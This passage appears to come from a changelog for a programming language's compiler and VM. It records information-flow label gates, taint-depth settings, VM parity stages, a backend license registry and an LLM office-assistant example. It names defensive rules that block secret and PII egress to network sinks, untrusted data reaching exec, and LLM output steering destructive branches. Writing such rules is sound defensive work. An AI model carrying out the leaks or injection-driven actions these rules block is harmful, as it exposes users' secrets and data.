- **№331 corpus adapted to the chain** (the language evolution this naryad mandates): every store construction is origin-bound; the `w1_handle_opaque` error contract is unchanged. REFERENCE §2.8 (origins + chain), ADR-0164 written before code; threat-model gains `ORIGIN_REQUIRED` + `ORIGIN_DECL_INVALID`.

### Added — registry: backend registry + license classes + distribution gate (Naryad #333, P0/feature/registry, issue #460, ADR-0163)

- **Backend registry SSOT** (`src/backends.rs`): `BACKEND_REGISTRY` — spec!-style static table; every entry = (class `STT|TTS|Omni|VisionUnderstanding|LLM`, weights identifier, SHA-pin, license class `osi|non-osi|restrictive`, license note). Seed entries (reported loudly; classes only — legal fine-reading is out of scope): `chatterbox-multilingual-v3` (MIT, osi), `koko-ro-82m` (Apache-2.0, osi), `z-image-turbo` (Apache-2.0, osi), `molmoact2` (Apache-2.0, osi), `wall-oss-0.5` (license NOT verified in-tree → restrictive by default-deny), `nemotron-3-nano-omni-30b-a3b` (NVIDIA Open Model License, non-osi — the MDL-3 test case).
- **The SHA-pin boundary is a TYPE**: `ShaPin::Pinned(hash)` or `ShaPin::PendingNo334` — real weights are not vendored in-tree (PARKED №294), so there is NO hash to state and fabricating one is forbidden; №334 replaces every `PendingNo334` with a real pin and refuses to load the pending variant.
- **Distribution gate** `BACKEND_LICENSE_DISTRIBUTION` (Category-A Error): a program that NAMES non-osi/restrictive weights (string literals at any position, case-insensitive exact match + the `vision { model: … }` field) does not compile — the error names the license class and the registry record. Precedent: the `MODEL_WEIGHTS_UNSAFE` literal-URL posture.
- **The licensing bridge**: `profile licensing { backends: permissive_with_audit }` (№325 precedent — loud, validated, audited) downgrades the gate to Info audit events (`BACKEND_LICENSE`); usage is allowed but never silent. Profiles are INDEPENDENT flags (`ResolvedProfiles`): `licensing` does not weaken the №325 sink clearance; `legacy` does not unlock non-OSI weights. `profile::validate` accepts both shapes loudly (unknown names/options stay semantic errors).
- **`backend_list()`** — read-only language surface over the registry (`List[Struct { name, class, weights_id, pin, license, license_note }]`). Registry 429→430 (category `registry`, 41st module); classification №316 SSOT 430/430; REFERENCE regenerated (0 TODO); threat-model Category-A table gains `BACKEND_LICENSE_DISTRIBUTION` (+ `MEDIA_HANDLE_OPAQUE` from №331); ADR-0163 written before code.

### Changed — docs/security: SECURITY.md + threat-model.md synchronized with the label lattice (Naryad #377, P1/docs/security, issue #444)

- **SECURITY.md**: new section "Label lattice controls (Wave 1 — ADR-0154/0156/0161, landed 2026-09-15)" — the three-axis label model (conf `public < consented < private < poisoned` with poisoned as an absorbing quarantine; integrity dual; consent join/meet), the compile-time gates (`SINK_CLEARANCE` family with the specialized class vocabulary, `UNTRUSTED_DECISION`, the `redact` policy registry with target confidences, literal markers), the `profile legacy` migration bridge (what it weakens — ONLY the №325 clearance verdicts; what it does NOT weaken — every other Category-A gate; how long — bridge, not residence, exit criterion = per-program burn-down of audit events), the runtime second line (`LabelJoin`/`SinkCheck`, `[SINK_CLEARANCE_RUNTIME]`, JIT dispatch gap), the leak suite as BLOCKING evidence (28 negatives + 16 positives), and honest status (PARKED objects unchanged, consent sources Phase 2 №335, grant algebra Phase 3 №339).
- **docs/threat-model.md**: new section "Label lattice (Wave 1) — labeled trust boundaries" — three labeled boundaries (egress/decisions/downward moves) + the `profile legacy` bridge + the leak-suite evidence set (28 pinned-class negatives, 16 positives, `BLOCKING = true` since №325, corpus outside the golden cycle) + runtime parity as the second line + phase boundaries (honest). Links to ADR-0154/0156/0158/0161 (ADR-0158 is the booking; implemented declassify contract in ADR-0154 §10).
- **truth-up in the same pass**: the stale "Known Boundaries" bullet (interprocedural taint "bounded to `TAINT_INTERP_MAX_DEPTH = 2`") updated to the №376 reality — configurable `METALOGOS_TAINT_DEPTH` (1..=16, default 4, measured +14.2%), per-module summaries cache.
- **grep-verification**: 22 lattice terms cross-checked between SECURITY.md / threat-model.md / REFERENCE.md §2 / the code (`src/audit.rs` class names, `REDACT_POLICIES` registry) — 0 contradictions; every class name in the docs is byte-identical to its `check_id` in `src/audit.rs`.
- **boundaries (loud)**: documentation only — no new controls, no code changes, no new promises; PARKED (real-weights) status restated, not changed. No `todo!`/`unimplemented!`/`SKELETON` in the new sections.

### Changed — security: configurable interprocedural taint depth + cross-module summaries cache (Naryad #376, P0/security, issue #443)

- **configurable depth**: `TAINT_INTERP_MAX_DEPTH = 2` (const) → `METALOGOS_TAINT_DEPTH` env (integer 1..=16; unset/invalid → default). **Default 4**, chosen by the measured overhead: auditing the 222-file examples corpus, depth 2 → 4 costs **+14.2%** cold analysis time (59.7 ms → 68.1 ms; depth 8 → +23.8%) — within the +50% dispatch threshold (№379 will re-confirm on the real corpus). The depth-3/4 coverage hole for office dept/chain patterns (source → wrapper → router → sink) is closed at the default.
- **cross-module summaries cache**: pattern summaries are cached per module — key = (FNV-1a hash of the source content, depth); an UNCHANGED module is never recomputed, a changed module is; the depth is part of the key so re-measuring at another `METALOGOS_TAINT_DEPTH` recomputes honestly. Counters exposed for tests via `#[doc(hidden)]` `summaries_cache_stats()`/`summaries_cache_clear()`.
- **red/green examples**: `examples/taint_chain_d3.mlog` / `taint_chain_d4.mlog` — office dept/chain shapes of depth 3 and 4 (sanitized variant included as the escape-hatch contract). Both flagged at the default configuration (tests).
- **preserved (loud)**: `INTERP_DEPTH_LIMIT` warning (now reports the CONFIGURED depth), `bounded_recursion` cycles flag, sanitizer lift (`render()`/`escape_html()`), zero-false-positive contracts of №292/№295 — all green unchanged.
- **truth-up (honest scope note)**: on the current corpus the depth flip is largely PREVENTIVE — pure passthrough nests were already caught by raw summaries + the unbounded sink-arg recursion, and the №322/№328 label-based sink gate catches the shape independently (a `sink clearance violated` Error). The depth config + the cache are the mechanism deliverables; full fixpoint / points-to stays a Phase-7 long-term line.
- **tests**: `tests/naryad_376_taint_depth.rs` (4): red/green examples caught at default (incl. sanitizer no-double-report), env switch (unset→4, 2, 4, invalid/0/17→fallback; serialized via a process-local mutex), cache recompute-only-on-change (insert/hit counters, changed-module insert, cached-path correctness), no-stubs.
- **docs**: limitations.md + threat-model.md + README taint rows updated (configurable depth, measured numbers, cache); audit.rs doc comments carry the measurement.
- **boundaries (loud)**: full fixpoint / points-to (Phase 7) NOT covered; flow-sensitivity NOT covered; `METALOGOS_TAINT_DEPTH` invalid values silently fall back to the default (documented). No `todo!`/`unimplemented!`/`SKELETON`.

### Changed — feature/adapt: real golden-task battery accuracy for mutate keep/rollback (Naryad #375, P0/feature/adapt, issue #442; ADR-0112 addendum)

- **real metric**: the mutate keep/rollback decision no longer runs on the constant 0.95 in REAL mode. The mutated pattern is measured on a golden-task battery: the eval-block datasets registered for the pattern (ADR-0050) + the pattern's pre-mutation few-shot, deduped by input. Held-out split: accuracy is NEVER measured on the tasks the mutation was built from (build set = the mutation's own new-example inputs). Deterministic seeded order (fixed FNV-1a seed `0x9E3779B97F4A7C15`) — same battery + same mutation → byte-identical measurement across runs. The answer path is the pattern's real LLM call; backend errors count as incorrect; an EMPTY held-out set scores 0.0 (no evidence, no keep).
- **minimum**: battery < 20 tasks → loud `BELOW MINIMUM 20` marker in the mutate log; the measurement still runs.
- **mock mode unchanged (loud)**: `METALOGOS_MOCK_LLM` (default-on — the codebase-wide test-mode convention) keeps the 0.95 stub with byte-identical message formats; this is the ONLY place the stub survives (ADR-0112 addendum). Mock-mode message contract pinned by tests.
- **rollback_if semantics UNCHANGED**: the CompareOp/ConditionOp threshold mapping was not touched — only the input value stopped being a constant.
- **implementation**: shared `measure_battery_accuracy` + `MIN_BATTERY_TASKS` + TW `call_llm_for_battery` in `src/interpreter/learnable.rs`; TW mutate path (`src/interpreter/hooks.rs`) assembles the battery (eval datasets + few-shot) and appends the battery note `(battery: N tasks, held-out H, correct C[, BELOW MINIMUM 20])` to the mutate log in real mode; VM mutate path (`src/vm.rs`) measures the pre-mutation few-shot battery (the VM Program carries no eval blocks — documented difference).
- **tests**: `tests/naryad_375_mutate_metric.rs` (5, mock mode: message contract, threshold edges, p2 golden, TW↔VM parity) + `tests/naryad_375_real_mode.rs` (5, real mode in a separate process: battery measurement, eval-dataset feed, no-condition keep+report, determinism, VM parity).
- **docs**: ADR-0112 status → "Accepted + IMPLEMENTED (№375)" with the full methodology addendum; `docs/limitations.md` mock-metric row closed for real mode; REFERENCE §5.15 accuracy note rewritten.
- **boundaries (loud)**: NN training metrics (`src/nn/*`) — separate line, untouched; real-LLM battery answering requires a configured provider (errors count as incorrect — the honest degradation); VM battery lacks eval-dataset tasks (Program carries no eval blocks — TW-only enrichment); mutation QUALITY itself is decided by the battery, not by this naryad. No `todo!`/`unimplemented!`/`SKELETON`.

### Changed — BREAKING — feature/lang: error-protocol — `try` returns a structured result (Naryad #374, P0/feature/lang, issue #441; ADR-0142 candidate (b))

- **BREAKING**: `try expr` no longer returns the bare inner value / a bare `Unit` on error. It now returns `Struct { ok: Bool, value: Value, error: Unit | Struct { code, message } }` on BOTH backends. Old code probing errors via `type_of(r) == "Unit"` or `r == Unit` breaks — migrate to `r.ok == false` (see the REFERENCE §Migration section; mlog has no unary `!`, so the `!r.ok` form from the ADR is pseudocode).
- **shape** (shared builder `try_result_struct` in `src/interpreter/values.rs` — TW and VM cannot diverge): success → `ok: true`, `value` = the inner expression's value (type preserved), `error` = Unit; error → `ok: false`, `value` = Unit, `error` = `Struct { code: "RUNTIME_ERROR", message: <the runtime error text> }` (type_name `TryResult`/`TryError`).
- **`code` convention (loud boundary)**: runtime errors do not yet carry ADR-0131/0140 diagnostic codes — the generic stable code `RUNTIME_ERROR` is used; the full text rides in `message`. Richer per-cause codes land when runtime errors are promoted to structured diagnostics (future ADR-0131 registry extension).
- **implementation**: TW `Expr::Try` (`src/interpreter/execution.rs`) and VM `Instruction::TryEval` (BOTH dispatch loops) build the result through the same shared function; stderr still logs `[try] caught error: …`; grammar UNCHANGED; builtin signatures UNCHANGED (ADR-0142 constraints).
- **migration surface (all green, zero output changes)**: 29 golden examples migrated from `type_of(x) == "Unit"` to `x.ok == false` (the `.expected` files are UNTOUCHED — the migrated probes compute the same booleans); `p91_try_success_path` success-path checks migrated to `r.ok and type_of(r.value) == "String"` (golden still `4/4`); stale comments updated (`try → Unit` → `try → ok = false`).
- **tests**: `tests/naryad_374_try_struct.rs` (7): success/error shape, wrong-arg-type error (unknown functions are a COMPILE-time rejection — outside try's reach, documented), nested try via `let` (grammar binds `try` to `unary_expr`), try in pattern/route bodies (the VM's shared execute_code loop), multiple try sites, p91 migration regression, no-stale-probes gate over all examples, no-stubs.
- **docs**: REFERENCE §Try rewritten + new §Migration section (before/after); ADR-0142 status → "Accepted + IMPLEMENTED (№374)"; ADR-0106 annotated (no supersede — soft-failure still governs optional paths; try-struct is a plain struct value, not an Option/Result type).
- **boundaries (loud)**: `?`-operator early return (candidate (a)) — rejected as priority, not excluded from the future; Result/Option types still rejected (ADR-0106 stands); no grammar/bytecode changes (TryEval instruction reused — only its result value changed). No `todo!`/`unimplemented!`/`SKELETON`.

### Added — feature/vm: VM Stage 2 — parity gate + nightly soak (Naryad #373, P0/feature/vm, issue #440)

- **parity gate** (`tests/naryad_373_parity_gate.rs`, 5 tests): (1) the crosscheck source must contain EXACTLY two `continue;` exclusion sites — any NEW exclusion fails loudly and forces naryad-style re-justification; (2) every golden example is classified into exactly one of crosschecked / negative-contract / frozen candle list (the frozen list cannot rot — file renames are caught); (3) all six Stage-1 rows in `docs/limitations.md` must stay CLOSED (№369–№372) while the serve default-flip row stays OPEN (Stage 3 decision); (4) the soak workflow exists, is nightly-scheduled AND dispatchable; (5) no stubs.
- **exclusion audit (was → remains → why)**: Stage-0 inventory (`docs/research/vm-gaps-inventory.md`) had 4 VM-uncovered classes — Match statement/`match_expr` (CLOSED №369), block if/else as VALUE (CLOSED №370), binop coercion `p118_collection_utils` (CLOSED №371), PRNG + Bool→String `reflex_math` (CLOSED №372 — PRNG via truth-up: shared registry all along). REMAINING (sanctioned, not VM-uncovered): (a) negative-test contracts (`*unknown_fn*`, `*wrong_*`) — designed-to-fail, explicitly sanctioned by ADR-0141 §D3; (b) 11 candle-feature-gated examples (`reflex_seq_*`/`reflex_gen_*`) — fail identically on BOTH backends without the `candle` feature, verified by the candle-tests CI job (№200). **Parity = 100% modulo sanctioned classes.**
- **crosscheck header**: the stale "VM is experimental … match/block-if-else excluded" comment replaced by the Stage-2 status + the gate pointer.
- **soak** (`.github/workflows/soak.yml`): nightly cron 02:00 UTC + `workflow_dispatch`; runs lib tests, the parity crosscheck + №373 gate, the FULL integration suite, doc-tests (`mlog test --docs`), and prints a duration/date report; each green run = one 24h-soak data point for the Stage-3 decision (dispatch #379). Job timeout 350 min.
- **limitations**: verification-only (grep gate in the №373 test) — all Stage-1 VM rows CLOSED; the open "VM is not the default backend for `mlog serve`" row is the Stage-3+ gate, intentionally open.
- **boundaries (loud)**: the default flip of `mlog serve` is NOT part of this naryad (Stage 3 — the dispatch #379 decision on soak data); JIT (ADR-0073/ADR-0156 §2) — a separate line; no `todo!`/`unimplemented!`/`SKELETON`.

### Added — feature/vm: VM Stage 1.4 — PRNG state + Bool→String parity with TW (Naryad #372, P0/feature/vm, issue #439)

- **PRNG truth-up (loud)**: the "VM has no PRNG state" claim was STALE. `random_seed`/`random` route through the SHARED builtin registry (thread-local xorshift64 state in `src/builtins/math.rs`) on BOTH backends — identical seed yields identical sequences on TW and VM (verified: seed(42) first element `0.16258225917040392` on both; reseeding restarts deterministically; zero-seed fallback identical). No VM code was needed for PRNG — the contract is now LOCKED by test vectors.
- **vm** (`src/vm.rs`): Bool→String fixed at the ROOT — the encoding, not the formatter. VM comparisons (`eval_cmp` all arms), `CmpNe` (Bool inversion), `eval_contains`/`Instruction::Contains` (String + List arms), `Instruction::StartsWith`, and the MatchTest predicate push sites now produce `Value::Bool` (TW's encoding) instead of Float 1.0/0.0. `to_string(a == b)` prints "true"/"false" on BOTH backends (the old VM printed "1"/"0" because the comparison RESULT was a Float — `str`/`to_string` are shared builtins and were never the divergence). Truthiness (`JumpIfNot`/`is_truthy`) is Bool-aware already — control flow unchanged; CmpNe keeps a legacy Float branch for old `.mbc` safety.
- **crosscheck**: the `reflex_math.mlog` exclusion (№177) is LIFTED — math builtins + random + Bool formatting run end-to-end with identical output on both backends and match the golden `.expected`.
- **tests**: `tests/naryad_372_prng_bool_format.rs` (6): PRNG same-seed sequences (seed 42/7, reseed-in-run, zero seed), the locked golden vector, Bool→String parity (eq/ne/ordering/strings/literals/in-concat), Bool control-flow parity (if/while/Ne-instruction), string predicates (contains/starts_with/ends_with), reflex_math golden regression.
- **limitations**: both `docs/limitations.md` rows closed (PRNG — truth-up "stale claim"; Bool→String — fixed).
- **boundaries (loud)**: mixed-type comparisons (e.g. `true == 1.0`) still coerce numerically in `eval_cmp` where TW errors — pre-existing, observable only in programs TW rejects; not touched here. The standalone `Instruction::StartsWith`/`Contains` arms are not emitted by the current compiler (calls go through the shared registry) — converted for consistency. No new bytecode instructions; old `.mbc` runs identically. No `todo!`/`unimplemented!`/`SKELETON`.

### Added — feature/vm: VM Stage 1.3 — binop coercion parity with TW (Naryad #371, P0/feature/vm, issue #438)

- **vm** (`src/vm.rs`): `eval_binop` now mirrors the TW interpreter (`src/interpreter/execution.rs`) EXACTLY: (1) the same opaque-type restriction on `+` (Secret/Html/Query/Encrypted/Hash/Subgraph cannot be concatenated — `cannot concatenate opaque type …`); (2) the same `MAX_STRING_LENGTH` (1 MB) limit on concatenation — `string length N exceeds maximum allowed 1000000` (previously the VM had NO limit: a >1 MB concat succeeded on VM and errored on TW — a real parity divergence, not just wording); (3) heterogeneous `+` (List+String, Bool+String, Float+String, List+List, …) errors with the TW wording `type mismatch in string concatenation: … + … (use to_string() explicitly)`; (4) non-Add binops on non-Float operands error with the TW wording `type mismatch in binary operation: …` (the old VM messages `type mismatch: List Add String` / `cannot apply Div to two Strings` diverged from TW and broke TW↔VM error parity).
- **coercion truth-up (loud)**: the crosscheck comment claimed "TW auto-coerces List+String" — STALE. Current TW does NOT auto-coerce: heterogeneous `+` is a loud error in TW too (the historical lenient behavior was tightened in the string-safety work). Stage 1.3 therefore lands as ERROR-PARITY alignment (VM catches up to the stricter TW), test-vector-fixed: every heterogeneous/opaque/limit vector asserts the two backends produce the IDENTICAL error string.
- **crosscheck**: the `p118_collection_utils.mlog` exclusion (№118/ADR-0105) is LIFTED — the example (unique/chunk/sort + concatenation chains) runs end-to-end with identical output on both backends and matches its golden `.expected`.
- **tests**: `tests/naryad_371_binop_coercion.rs` (8): p118 golden regression, heterogeneous-add error parity (5 vectors), string-concat parity (basic/empty/nested/accumulator), float-arith parity incl. division by zero, non-Add type-error parity (String/Bool operands), the 1 MB length-limit parity (over-limit + at-limit), opaque Secret concat parity (both operand orders), `print()`-in-concat parity lock.
- **limitations**: `docs/limitations.md` row "Binop coercion (heterogeneous List+String)" closed (№371).
- **boundaries (loud)**: comparison operators (`==`, `<`, …) route through the VM's separate `eval_cmp` (Float 1.0/0.0 encoding) — Bool→String formatting divergence (TW "true" vs VM "1") is №372's scope, untouched here; `And`/`Or` short-circuit unchanged; no new bytecode instructions (binop semantics is a VM-side change, old `.mbc` runs identically). No `todo!`/`unimplemented!`/`SKELETON`.

### Added — feature/vm: VM Stage 1.2 — block if/else as a VALUE compiles to bytecode (Naryad #370, P0/feature/vm, issue #437)

- **bytecode**: `Instruction::Dup` (the match/if scrutinee stays on the stack while copies are tested) + the VALUE-EXPRESSION REGISTER triple `BeginValueExpr` / `KeepLastValue` / `EndValueExpr`. The register lives in VM STATE (`Vm.value_registers`), NOT in stack cells — a value form is safe in ANY expression position (the first №370 draft used a hidden slot and was unsound exactly there: `"[" + (if c {..} else {..}) + "]"` clobbered the `"["` temporary with a register write into the temporaries' stack region — caught by the naryad's own binary-position test). `execute_code` saves/restores the register stack per invocation, so an early `return` inside a branch cannot leak a register into the caller's execution.
- **compiler** (`src/compiler.rs`): `Expr::BlockIfElse` compiles natively in ANY expression position (let/return/binary/argument — the grammar puts it in `primary_expr`): `Begin`, condition, jump structure (`JumpIfNot` per branch, lazy per-branch condition evaluation — TW side-effect order), branch bodies through the VALUE-MODE statement path, `End`. `compile_value_stmt` (shared with №369's match-expr arms): `ExprStmt` keeps its value via `KeepLastValue` (TW `eval_statements_cf`: only non-Unit updates the register — a trailing print does not reset the value); nested STATEMENT if/else/match inside a branch leaks their branch value into the same register (TW `eval_block!` semantics — observable precisely in value context); everything else falls through to the ordinary statement compiler.
- **no new dispatch**: the jump structure reuses the existing `Jump`/`JumpIfNot` — the value register is plain VM state; nothing new to dispatch in the two VM loops (the naryad's "dispatch ×2" is satisfied vacuously and recorded loudly).
- **№369 rework (transparent)**: `compile_let_match` and the value-mode match migrated to the same register scheme (`Dup` + stack-resident scrutinee instead of a scratch slot) — one mechanism for both Stage-1.1 and Stage-1.2, safe everywhere. `Instruction::StoreLastLocal` (№369 draft) removed in favor of `KeepLastValue` before any release cut.
- **crosscheck example**: `examples/p370_block_if_value.mlog` — the value form was exercised by ZERO examples before (the crosscheck could not see the gap); now let-position + else-if chain + nested block-if value + statement-if value leak run through BOTH backends in CI.
- **tests**: `tests/naryad_370_block_if_else_vm.rs` (13): basic value, return position, binary/argument position, else-if chain, Unit fallthrough (typed comparison), nested value forms, statement-if value leak, match inside a branch, last-non-Unit rule, early return inside a branch, single condition evaluation, golden contract, no-stub.
- **boundaries (loud)**: the block if/else as a STATEMENT keeps its existing VM compilation (branch values still discarded mid-body — the fall-through value convention applies only at pattern/route body level, №250); `profile legacy` unaffected; no `todo!`/`unimplemented!`/`SKELETON` (asserted by test).

### Added — feature/vm: VM Stage 1.1 — Match statement + match_expr compile to bytecode (Naryad #369, P0/feature/vm, issue #436)

- **bytecode**: `Instruction::MatchTest(MatchTest)` (one arm test — pops the scrutinee, Compare arms pop the threshold first; the matching predicate is the SHARED `MatchTest::matches` → `ast::MatchArm::compare_values`, the same code TW runs) + `Instruction::StoreLastLocal` (TW-parity last-value store: keep only non-Unit — `eval_statements_cf` contract). Both appended at the END of the enum (bincode positional-index compatibility — old .mbc deserializes and runs identically).
- **AST**: `Expr::MatchExpr { scrutinee, arms, else_body, span }` — match-as-expression is a first-class value now; `MatchArm::body()/matches_value()` + `MatchArm::compare_values` (moved verbatim from the interpreter — single source of truth for both backends). `CompareOp` gained Serialize/Deserialize/PartialEq (.mbc parity).
- **parser**: the №173b lossy hack is GONE — `let x = match y { ... }` preserves the full arm structure in `Expr::MatchExpr`. Previously the arms were discarded at parse time and the let bound the raw scrutinee (the REFERENCE §Match contract — "the value of the last expression in the selected arm" — was violated by BOTH backends; the arms were dead code).
- **compiler** (`src/compiler.rs`): `compile_match_stmt` (statement form, both statement compilers — the shared `compile_stmt_with_locals` had a silent `_ => {}` no-op: a nested match inside an if/while body compiled to NOTHING) + `compile_let_match` (expression form via the LetBinding arms; hidden `#`-slots — impossible in user IDENTs — hold the once-evaluated scrutinee and the last-value register; lazy per-arm threshold compilation = TW side-effect order). `keep_last_value` for a final-body match — №250 parity: the matched arm's trailing value is the body's fall-through value (`respond(...)` inside the final arm IS the route's response).
- **VM** (`src/vm.rs`): `MatchTest` + `StoreLastLocal` dispatch in BOTH loops (`execute_main_code` + shared `execute_code` — pattern bodies and route handlers).
- **semantics** (TW): `Statement::Match` routes through the shared predicates (identical behavior); `Expr::MatchExpr` evaluates arms against a CLONED local env (the `Expr::BlockIfElse` №14 P0-3 precedent — the value context does not leak lets).
- **labels/effects** (`semantic.rs`): MatchExpr walks — label = scrutinee join every arm body (control dependence, REFERENCE §labels), effects = scrutinee + arm bodies + else, flow-env forks per branch (№323 D5), SVG-security walk.
- **crosscheck**: the `p_match_switch.mlog` exception (№109/ADR-0105) is LIFTED — the example now runs end-to-end (`flow Main` drives all four match patterns; golden `.expected` = `a=correct b=default_hit c=fallback d=second`) through BOTH backends.
- **superseded contracts**: №41 (`match` must fail route compilation → now compiles + serves, MatchTest asserted), №160 block 1 (match-in-route must fail VM startup → now starts and serves the matched arm; the examples scan inverted into a compile check), №197 sexpr gained the MatchExpr arm.
- **tests**: `tests/naryad_369_vm_match.rs` (15): statement form (all four arm kinds, first-match-wins, else, nested + loop break/continue), match_expr value contract (last non-Unit wins, Unit fallthrough, compare numeric-first, starts_with/contains, nested, single scrutinee evaluation), TW↔VM parity on every case, .mbc round-trip, crosscheck-exception-lifted grep, golden contract, no-stub.
- **boundaries (loud)**: `Expr::BlockIfElse` stays TW-only (№370); block-statement trailing VALUES inside arm bodies (if/else as an arm's last statement) remain part of the known VM block-value gap — the documented `ExprStmt` capture covers the REFERENCE contract; nested `let` inside a match_expr arm does not leak to the outer env (BlockIfElse precedent). No `todo!`/`unimplemented!`/`SKELETON` (asserted by test).

### Added — dogfood: the Fosved Office contour under the Wave-1 gate + the ergonomics measurement (Naryad #329, P0/dogfood, issue #423)

- **the contour** `examples/l1_dogfood.mlog`: the office assistant drafts the morning brief with `call_llm` (a Source: public conf, untrusted integrity — №316), delivers it via `send_message` (an irreversible Sink), and posts a metrics webhook via `http_post` (live in production, dead in CI — the static gate sees both branches identically). The golden pair (`l1_dogfood.expected`) runs the contour end-to-end in CI.
- **the gate on a real contour** (the Phase-1 Go criterion): the contour compiles AND runs under №325/№327 — the run path enforces `audit_category_a`, which promotes the sink gate. `call_llm` runs in mock mode by default; `send_message` without `TELEGRAM_BOT_TOKEN` takes the audit-stub path — deterministic, no network.
- **the measurement** (plan v2 §13.3): exactly TWO annotations keep the contour green — `escape_html(draft)` (the trust-restoring sanitizer; the un-sanitized draft is UNTRUSTED_EGRESS_NETWORK) and `redact(token, "hash_only")` (the only downward move, №326; the raw token is PII_EGRESS_NETWORK in the body position, SECRET_EGRESS_NETWORK in the address position). 2 annotated lines / 13 code lines ≈ 15% — under the 50% rebuild threshold. Pinned by `tests/naryad_329_dogfood.rs` (12): red/green pairs, the full office sink fact list (send_message, http_post, exec, git_push, write_file + the output/memory vocabulary), the pii_strip conservatism pin, the zero-delta plain contour, the annotation inventory by place, no-stub grep.
- **boundaries (loud)**: the real Fosved Office codebase integration is outside this repository — the equivalent contour is the §3 deliverable per the naryad; the Go/No-Go decision is №330 (the owner's call). No `todo!`/`unimplemented!`/`SKELETON` (asserted by test).

### Added — feature/vm: runtime label parity — LabelJoin/SinkCheck in the bytecode (Naryad #328, P0/feature/vm, issue #422)

- **bytecode**: `Instruction::LabelJoin { dst, src }` (componentwise runtime label join; `@source` names a №316 Source builtin seed) and `Instruction::SinkCheck { fn_name, arg, line }` (the runtime twin of the №325 gate). `pub fn is_jit_eligible` — the SSOT predicate for the dispatch-gap rule: label instructions are explicitly outside the JIT-eligible class (ADR-0156 §2 — the future JIT dispatcher must reject label-bearing functions with a distinct error, never skip silently; pinned by test).
- **VM** (`src/vm.rs`): a runtime label environment (`BTreeMap<String, Label>` — the №322 lattice); `LabelJoin` seeds/merges it, `SinkCheck` enforces the clearance (`public`; exec refuses untrusted) with a distinct `[SINK_CLEARANCE_RUNTIME]` error + `[SINK_CLEARANCE][audit-event]` stderr line.
- **compiler** (`src/compiler.rs`): source-backed `let`/assignments lower into `LabelJoin`; sink call sites lower into `SinkCheck` (identifiers and direct-source arguments) — in both compile paths (top-level statements and pattern bodies via `RegisterPattern`).
- **golden verdicts**: the run and compile paths agree on rejecting and accepting label programs (pinned by test).
- **ADR-0156** filled (reserved → Accepted): the parity matrix TW/VM/JIT for Phase 1, the dispatch-gap rule, the instruction contracts.
- **tests**: `tests/naryad_328_vm_label_parity.rs` (8). **boundaries (loud)**: the JIT compiler is not in the tree — the rule is pinned via the eligibility predicate; media label flows are Phase 2. No `todo!`/`unimplemented!`/`SKELETON` (asserted by test).

### Added — security/labels: integrity axis & anti-injection — untrusted data must not decide control flow (Naryad #327, P0/security/labels, issue #421)

### Added — security/labels: integrity axis & anti-injection — untrusted data must not decide control flow (Naryad #327, P0/security/labels, issue #421)

- **Category-A gate `UNTRUSTED_DECISION`** (`src/audit.rs` + `semantic.rs::integrity_decision_violations`): at every decision position — `if`/`else if` conditions, `while` conditions, `match` scrutinees — the deciding expression's label must be `trusted`; untrusted data in a decision position is a compile error. Untrusted data as DATA is legal (carrying/transforming/returning — pinned by test).
- **the integrity axis in action**: №316 Source builtins (`http_get`, `env`, `json_body`, `form_data`, `query_param`, `call_llm`, `read_file`, …) produce `untrusted` labels; the componentwise join poisons derivatives (`upper(trim(answer))` stays untrusted — the gate sees through pure wrappers). Provenance tracking names the untrusted SOURCE in the diagnostic (a direct Source call, through variable bindings and wrapper calls: `call_llm (via redact)`), plus the decision point (`decides a 'if' in pattern P`).
- **the sanctioned paths to a trusted decision**: validate before deciding, or one-way-redact — `hash_only` now restores `trusted` (the data is destroyed; the result is a compiler-derived value, `bottom`). Fixed the static mapping: a one-way policy returns full `bottom` regardless of the input (previously a `public, untrusted` input kept its untrusted integrity through `redact`).
- **sink-target decisions** keep their №325 classes (UNTRUSTED_EXEC_DECISION, UNTRUSTED_EGRESS_NETWORK) — no double classification.
- **showcase** `examples/l1_injection.mlog`: `Decide` (LLM answer drives a branch around a destructive action → rejected, source named) vs `Carry` (the same answer as data → compiles).
- **tests**: `tests/naryad_327_integrity_gate.rs` (11): the red/green scenario, all three decision positions (if/while/match, else-if chains), the integrity join through pure wrappers, private-but-trusted decisions legal (conf ≠ integrity), hash_only-restored decisions, zero delta for plain programs, the showcase, no-stub grep.
- **boundaries (loud)**: content-level injection analysis is out of the compiler's scope; media sources Phase 2; taint polymorphism deferred. No `todo!`/`unimplemented!`/`SKELETON` (asserted by test).

### Added — feature/labels: redact/declassify — policy as a value, the only sanctioned downward move (Naryad #326, P0/feature/labels, issue #420)

### Added — feature/labels: redact/declassify — policy as a value, the only sanctioned downward move (Naryad #326, P0/feature/labels, issue #420)

- **policy registry** (`src/builtins/string.rs::REDACT_POLICIES` — extensible): the second argument of `redact()` is a policy VALUE naming the transformation and the target conf. Built-ins: `hash_only` → `public` (one-way SHA-256 fingerprint — the sanctioned path down), `all`/`secrets` → `public` (legacy ADR-0136 masking), `pii`/`pii_strip`/`truncate` → `private` (conservative: pattern strips and truncations can miss data — they do NOT declassify, the №325 gate keeps blocking their output). Unknown policy words are loud runtime errors; the registry is open to future user-defined policies (values — later, loud boundary).
- **static label mapping** (`semantic.rs`): `label_source` reads the same registry — the policy's `target_conf` drives the result label (one-way → bottom for private inputs; conservative → the input label passes through). `audit.rs::redact_result_taint` reads it too — the legacy `SECRET_LEAK` check now understands inline `redact(env(...), "hash_only")`.
- **unconditional audit events** (`audit.rs::check_redact_events`): every `redact()` application across patterns/tools/routes/hooks/tests records `REDACT_APPLIED` (Severity::Info) — container, policy, target conf — plus a `[REDACT][audit-event]` stderr line. NOT switchable: no profile, no env toggles (ADR-0154 §10 — the paper trail of the downward move). Dynamic (non-literal) policies record `policy '<dynamic>'` with the conservative target.
- **showcase** `examples/l1_redact.mlog`: hash_only path down (compiles), pii_strip conservatism (the gate keeps blocking raw output); 3 events on the audit report.
- **tests**: `tests/naryad_326_redact_policies.rs` (14): registry contract, loud unknown words, downward path vs the №325 gate, conservatism, unconditional events incl. legacy and dynamic cases, runtime shapes (hash determinism/data destruction, truncation), the showcase, no-stub grep.
- **boundaries (loud)**: consent revocation and the poisoned cascade — Phase 2 (№335); `consent_ledger` integration — Phase 2; user-defined policies — the registry is open, values later. No `todo!`/`unimplemented!`/`SKELETON` (asserted by test).

### Added — security/labels: SINK_CLEARANCE gate on classified sinks + `profile legacy` (Naryad #325, P0/security/labels, issue #419)

### Added — security/labels: SINK_CLEARANCE gate on classified sinks + `profile legacy` (Naryad #325, P0/security/labels, issue #419)

